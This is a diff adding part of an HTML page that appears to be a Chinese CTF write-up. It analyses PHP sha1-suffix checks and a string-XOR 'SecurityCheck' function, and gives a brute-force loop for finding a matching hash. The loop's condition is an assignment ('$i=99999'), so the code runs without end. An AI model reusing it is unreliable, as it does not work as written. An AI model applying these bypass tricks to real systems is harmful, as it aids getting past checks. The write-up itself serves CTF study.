+</section>
+<section id="id3">
+<h4>后两个条件的分析：<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
+<ol class="arabic simple">
+<li><p>(substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)</p></li>
+<li><p>(substr(sha1($user),-6,6)) === ‘a05c53’)</p></li>
+</ol>
+<p>crypto 和 user 来自 SecurityCheck 函数：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">[$crypto, $user] = SecurityCheck($sha1,$sha2,$user);</span>
+
+<span class="x">function SecurityCheck($sha1,$sha2,$user){</span>
+
+<span class="x">    $p1 = &#39;/^[a-z]+$/&#39;;</span>
+<span class="x">    $p2 = &#39;/^[A-Z]+$/&#39;;</span>
+<span class="x">    </span>
+<span class="x">    if (preg_match($p1, $sha1) &amp;&amp; preg_match($p2, $sha2)){</span>
+<span class="x">        $sha1 = strtoupper($sha1);</span>
+<span class="x">        $sha2 = strtolower($sha2);</span>
+<span class="x">        $user = strtoupper($user);</span>
+<span class="x">        $crypto = $sha1 ^ $sha2;</span>
+<span class="x">    }</span>
+<span class="x">    else{</span>
+<span class="x">        die(&quot;wrong&quot;);</span>
+<span class="x">    }</span>
+
+<span class="x">    return array($crypto, $user);</span>
+<span class="x">}</span>
+</pre></div>
+</div>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">for($i=-99999;$i=99999;$i++){</span>
+<span class="x">$tmp = substr(sha1($i),-6,6);</span>
+<span class="x">if($tmp == &#39;a05c53&#39;){</span>
+<span class="x">    var_dump($i);</span>
+<span class="x">}</span>
+<span class="x">}</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
